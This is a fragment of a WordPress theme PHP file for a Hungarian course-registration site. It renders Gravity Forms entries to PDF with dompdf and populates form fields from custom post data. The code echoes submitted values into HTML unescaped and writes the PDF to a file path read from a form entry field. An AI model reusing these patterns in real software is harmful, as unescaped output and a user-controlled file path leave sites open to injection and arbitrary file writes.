														<td style="padding: 6px 10px; border-right: 1px solid #DFDFDF; border-bottom: 1px solid #DFDFDF; border-top: 1px solid #FFF; font-family: sans-serif; font-size:12px;"><?php echo $resztvevo['Email']; ?></td>
														<td style="padding: 6px 10px; border-right: 1px solid #DFDFDF; border-bottom: 1px solid #DFDFDF; border-top: 1px solid #FFF; font-family: sans-serif; font-size:12px;"><?php echo $resztvevo['Telefon']; ?></td>
													</tr>
													<?php }
													?>
													</tbody><tbody></tbody></table>
													</font>
		                                    </td>
		                               </tr>
		                               <tr bgcolor="#EAF2FA">
		                                    <td colspan="2">
		                                        <font style="font-family: sans-serif; font-size:12px;"><strong>Név / cégnév</strong></font>
		                                    </td>
		                               </tr>
		                               <tr bgcolor="#FFFFFF">
		                                    <td width="20">&nbsp;</td>
		                                    <td>
		                                        <font style="font-family: sans-serif; font-size:12px;"><?php echo rgar( $entry, '16' ); ?></font>
		                                    </td>
		                               </tr>
		                               <tr bgcolor="#EAF2FA">
		                                    <td colspan="2">
		                                        <font style="font-family: sans-serif; font-size:12px;"><strong>Irányítószám</strong></font>
		                                    </td>
		                               </tr>
		                               <tr bgcolor="#FFFFFF">
		                                    <td width="20">&nbsp;</td>
		                                    <td>
		                                        <font style="font-family: sans-serif; font-size:12px;"><?php echo rgar( $entry, '17' ); ?></font>
		                                    </td>
		                               </tr>
		                               <tr bgcolor="#EAF2FA">
		                                    <td colspan="2">
		                                        <font style="font-family: sans-serif; font-size:12px;"><strong>Település</strong></font>
		                                    </td>
		                               </tr>
		                               <tr bgcolor="#FFFFFF">
		                                    <td width="20">&nbsp;</td>
		                                    <td>
		                                        <font style="font-family: sans-serif; font-size:12px;"><?php echo rgar( $entry, '18' ); ?></font>
		                                    </td>
		                               </tr>
		                               <tr bgcolor="#EAF2FA">
		                                    <td colspan="2">
		                                        <font style="font-family: sans-serif; font-size:12px;"><strong>Adószám (cég esetén)</strong></font>
		                                    </td>
		                               </tr>
		                               <tr bgcolor="#FFFFFF">
		                                    <td width="20">&nbsp;</td>
		                                    <td>
		                                        <font style="font-family: sans-serif; font-size:12px;"><?php echo rgar( $entry, '19' ); ?></font>
		                                    </td>
		                               </tr>
		                               <tr bgcolor="#EAF2FA">
		                                    <td colspan="2">
		                                        <font style="font-family: sans-serif; font-size:12px;"><strong>Megegyezik a számlázási adatokkal?</strong></font>
		                                    </td>
		                               </tr>
		                               <tr bgcolor="#FFFFFF">
		                                    <td width="20">&nbsp;</td>
		                                    <td>
		                                        <font style="font-family: sans-serif; font-size:12px;"><?php echo rgar( $entry, '31' ); ?></font>
		                                    </td>
		                               </tr>
									   <?php if(rgar( $entry, '31' ) == "nem"): ?>
		                               <tr bgcolor="#EAF2FA">
		                                    <td colspan="2">
		                                        <font style="font-family: sans-serif; font-size:12px;"><strong>Név / cégnév</strong></font>
		                                    </td>
		                               </tr>
		                               <tr bgcolor="#FFFFFF">
		                                    <td width="20">&nbsp;</td>
		                                    <td>
		                                        <font style="font-family: sans-serif; font-size:12px;"><?php echo rgar( $entry, '22' ); ?></font>
		                                    </td>
		                               </tr>
		                               <tr bgcolor="#EAF2FA">
		                                    <td colspan="2">
		                                        <font style="font-family: sans-serif; font-size:12px;"><strong>Irányítószám</strong></font>
		                                    </td>
		                               </tr>
		                               <tr bgcolor="#FFFFFF">
		                                    <td width="20">&nbsp;</td>
		                                    <td>
		                                        <font style="font-family: sans-serif; font-size:12px;"><?php echo rgar( $entry, '23' ); ?></font>
		                                    </td>
		                               </tr>
		                               <tr bgcolor="#EAF2FA">
		                                    <td colspan="2">
		                                        <font style="font-family: sans-serif; font-size:12px;"><strong>Település</strong></font>
		                                    </td>
		                               </tr>
		                               <tr bgcolor="#FFFFFF">
		                                    <td width="20">&nbsp;</td>
		                                    <td>
		                                        <font style="font-family: sans-serif; font-size:12px;"><?php echo rgar( $entry, '24' ); ?></font>
		                                    </td>
		                               </tr>
		                               <tr bgcolor="#EAF2FA">
		                                    <td colspan="2">
		                                        <font style="font-family: sans-serif; font-size:12px;"><strong>Adószám (cég esetén)</strong></font>
		                                    </td>
		                               </tr>
		                               <tr bgcolor="#FFFFFF">
		                                    <td width="20">&nbsp;</td>
		                                    <td>
		                                        <font style="font-family: sans-serif; font-size:12px;"><?php echo rgar( $entry, '25' ); ?></font>
		                                    </td>
		                               </tr>
									   <?php endif; ?>
		                               <tr bgcolor="#EAF2FA">
		                                    <td colspan="2">
		                                        <font style="font-family: sans-serif; font-size:12px;"><strong>Fizetési mód</strong></font>
		                                    </td>
		                               </tr>
		                               <tr bgcolor="#FFFFFF">
		                                    <td width="20">&nbsp;</td>
		                                    <td>
		                                        <font style="font-family: sans-serif; font-size:12px;"><?php echo rgar( $entry, '30' ); ?></font>
		                                    </td>
		                               </tr>
		                               </tbody></table>
		<?php
		$content = ob_get_clean();
		$dompdf->loadHtml($content);

		// (Optional) Setup the paper size and orientation
		$dompdf->setPaper('A4', 'portrait');

		// Render the HTML as PDF
		$dompdf->render();
		  $output = $dompdf->output();
    file_put_contents(rgar( $entry, '34' ), $output);
		
}
add_action( 'gform_after_submission_7', 'varolista_save', 10, 2 );
function varolista_save($entry, $form){
	$entries = array();
	$entry[6] = substr($entry[5],0,-12);
	$entries[] = $entry;
	 GFAPI::add_entries( $entries, 5 );
}

require_once("gw-gravity-forms-better-pre-submission-confirmation.php");


function populate_tanf( $value ) {
	global $post;
	return get_post(get_field('kapcsolodo_tanfolyam',$post->ID)[0])->post_title;

  
}
add_filter( 'gform_field_value_tanfolyam_fill', 'populate_tanf' );

function populate_kiiras( $value ) {
	global $post;
	return get_post(get_field('kapcsolodo_tanfolyam',$post->ID)[0])->post_title . ', ' . get_field('kezdes',$post->ID);

  
}
add_filter( 'gform_field_value_kiiras_fill', 'populate_kiiras' );

add_filter( 'gform_pre_render_2', 'populate_ertekeles_form' );
function populate_ertekeles_form($form){
	 foreach ( $form['fields'] as &$field ) {
		

        if ( $field->id == 1 ) {
            $choices = array();

	$posts = get_posts(array(
		'post_type' => 'tanfolyam-kiiras',
        'meta_query' => array(
					'relation' => 'OR',
                        array(
                            'key' => 'ertekeltek_e_mar', // name of custom field
                            'value' => '0', 
                            'compare' => '=='
                        ),
						array(
            'key' => 'ertekeltek_e_mar',
            'compare' => 'NOT EXISTS'
        )
                    )            
	));
	
	
        foreach ( $posts as $post ) {
			$kezdes = get_field('kezdes',$post->ID);
			$cim = get_post($post->ID)->post_title . " - " . $kezdes;
            $choices[] = array( 'text' => $cim, 'value' => $cim );
        }

        // update 'Select a Post' to whatever you'd like the instructive option to be
        $field->placeholder = 'Melyik tanfolyamon vettél részt?';
        $field->choices = $choices;
        }

	
	 }
	  return $form;
}




function levi_scripts(){
    wp_enqueue_script( 'main.js', get_stylesheet_directory_uri() . '/js/main.js', array( 'jquery' ), '20160412', true );
    wp_enqueue_script( 'pentafilter.js', get_stylesheet_directory_uri() . '/js/pentafilter.js', array( 'jquery' ), '20160412', true );
    wp_enqueue_script( 'velocity.min.js', get_stylesheet_directory_uri() . '/js/velocity.min.js', array( 'jquery' ), '20160412', true );
    wp_enqueue_style( 'filter.css', get_template_directory_uri() . '/css/filter.css', array(), '20160412' );
}
add_action( 'wp_enqueue_scripts', 'levi_scripts' );